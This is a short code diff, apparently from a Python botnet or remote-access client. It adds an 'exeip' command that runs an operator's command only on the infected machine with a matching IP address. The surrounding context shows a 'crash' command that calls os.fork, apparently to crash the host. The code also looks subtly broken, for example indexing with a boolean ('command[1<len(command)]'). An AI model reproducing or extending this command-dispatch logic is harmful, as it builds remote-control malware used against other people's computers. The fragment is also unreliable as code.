@@ -98,7 +98,15 @@ while True:
                     else:
                         old_command = commandId
                         continue
-               if command.startswith("crash"):
+                if command.startswith("exeip "):
+                    localcmd = command.split()
+                    if localcmd[1] == ip:
+                        del localcmd[2]
+                        localcmd = ' '.join(localcmd)
+                    else:
+                        old_command = commandId
+                        continue
+                if command.startswith("crash"):
                    from os import fork
                    command = command.split()
                    if command[1<len(command)]:
